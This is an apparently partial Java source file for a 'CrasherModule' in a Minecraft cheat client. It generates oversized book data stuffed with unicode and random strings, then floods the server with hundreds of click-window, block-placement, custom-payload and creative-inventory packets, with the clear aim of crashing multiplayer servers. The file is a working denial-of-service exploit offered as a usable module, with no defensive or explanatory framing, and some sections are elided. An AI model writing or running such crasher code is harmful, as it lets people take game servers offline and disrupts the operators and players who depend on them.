...
public class CrasherModule extends Mod {
	public ModeSettings payloadMode = new ModeSettings("Payload Mode", new String[] { "BSign", "BEdit" });
	public NumberSettings packetSize = new NumberSettings("Packet Size", 10, 1, 50, 1);
	public NumberSettings packets = new NumberSettings("Packets", 100, 1, 1000, 1);
	...
	public CrasherModule() {
		this.addSettings(payloadMode, packetSize, packets, unicodePacket, extraPacket, randomPacket, sizePacket,
				clickWindow, blockPlacement, customPayload, creativeInventoryAction);
	}
	
	public void onEnable() {
		th = new PayloadThread();
        th.start();
	...
	public class PayloadThread extends Thread {
		...
		public void run() {
			...
			if (unicodePacket.isEnabled()) {
				...
				for (int i = 0; i < packetSize.value; i++) {
					list.appendTag(new NBTTagString(sb.toString() + RandomUtils.nextInt(1, 50000)));
				}
			...
			if (extraPacket.isEnabled()) {
				...
				tag.setString("author", sb.toString());
				tag.setString("title", sb.toString());
				tag.setTag("pages", list);
				stack.setTagInfo("pages", list);
				stack.setTagCompound(tag);
				buffer.writeItemStackToBuffer(stack);
			...
			if (randomPacket.isEnabled()) {
				for (int i = 0; i < packetSize.getValue() * 15; i++)
	...
	public void sendPackets() {
		...
		switch (payloadMode.getMode().toLowerCase()) {
		case "bsign":
		...
		if (clickWindow.isEnabled())
			for (int f = 0; f < packets.value; f++) {
				mc.getNetHandler().getNetworkManager()
						.sendPacketNoEvent(new C0EPacketClickWindow(0, 0, 0, 6, stack, (short) 0));
			}
			...
			for (int f = 0; f < packets.value; f++) {
				mc.getNetHandler().getNetworkManager()
						.sendPacketNoEvent(new C08PacketPlayerBlockPlacement(
								new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2, mc.thePlayer.posZ), 1, stack,
								0.0f, 0.0f, 0.0f));
			}

		if (customPayload.isEnabled())
			for (int f = 0; f < packets.value; f++) {
				mc.getNetHandler().getNetworkManager()
						.sendPacketNoEvent(new C17PacketCustomPayload(payloadText, buffer));
			}

		if (creativeInventoryAction.isEnabled())
			for (int f = 0; f < packets.value; f++) {
				mc.getNetHandler().getNetworkManager()
						.sendPacketNoEvent(new C10PacketCreativeInventoryAction(5, stack));
			}
	}
}
